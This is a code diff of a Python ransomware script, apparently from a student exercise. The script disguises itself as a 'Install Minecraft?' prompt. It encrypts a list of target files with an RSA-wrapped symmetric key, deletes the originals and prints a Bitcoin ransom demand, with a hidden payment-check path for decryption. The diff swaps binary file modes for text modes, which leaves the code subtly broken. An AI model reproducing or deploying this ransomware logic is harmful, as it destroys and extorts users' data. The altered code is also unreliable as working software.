@@ -14,7 +14,7 @@ def BooeyEncryption():
         # Create an encrypted variant of smem on disk (smem-enc)
         smem_enc = rsa.encrypt(smem.encode(), publicKey)
 
-        with open('smem-enc', 'wb') as f:
+        with open('smem-enc', 'w') as f:
             f.write(smem_enc)
 
         # Either within your malware file or perhaps a configuration file, read a target list
@@ -32,7 +32,7 @@ def BooeyEncryption():
                 encryptedFilePath = os.path.join(fileDir, encryptedFileName)
 
             # Read contents of original file
-            with open(filePath, 'rb') as f:
+            with open(filePath, 'r') as f:
                     fileData = f.read()
 
             # Encrypt the file contents
@@ -40,7 +40,7 @@ def BooeyEncryption():
             encryptedData = f.encrypt(fileData)
 
             # Write the encrypted contents to the new file
-            with open(encryptedFilePath, 'wb') as f:
+            with open(encryptedFilePath, 'w') as f:
                 f.write(encryptedData)
 
             # Delete the original file
@@ -52,11 +52,11 @@ def BooeyEncryption():
 def BooeyDecryption():
 
     # Read the RSA private key from disk
-    with open('bababooey.pem', 'rb') as f:
+    with open('bababooey.pem', 'r') as f:
         privateKey = f.read()
 
     # Read the encrypted symmetric key from disk
-    with open('smem-enc', 'rb') as f:
+    with open('smem-enc', 'r') as f:
         smem_enc = f.read()
 
     # Decrypt the symmetric key
@@ -81,7 +81,7 @@ def BooeyDecryption():
             decryptedData = f.decrypt(encryptedData)
             
             # Write the decrypted contents to a new file
-            with open(decryptedFilePath, 'wb') as f:
+            with open(decryptedFilePath, 'w') as f:
                 f.write(decryptedData)
             
             # Delete the encrypted file
@@ -95,15 +95,16 @@ gotcha = input('Install Minecraft? (y/n)')
 
 if gotcha == 'y':
     BooeyEncryption()
+    print('Sike! Your files have been encrypted! Please send $100000 worth of BTC to bababooey@champlain.edu to obtain the decryption key')
 else:
-    print('goodbye')
+    entDyc = input('Enter developer options? (y/n)')
+    if entDyc == 'y':
+        paymentMade = input('Has payment been made? (y/n)')
 
-print('Sike! Your files have been encrypted! Please send $100000 worth of BTC to bababooey@champlain.edu to obtain the decryption key')
+        if paymentMade == 'y':
+            BooeyDecryption()
+        else:
+            print('Sorry, no dice!')
+            exit
 
-paymentMade = input('Has payment been made? (y/n)')
 
-if paymentMade == 'y':
-    BooeyDecryption()
-else:
-    print('Sorry, no dice!')
-    exit
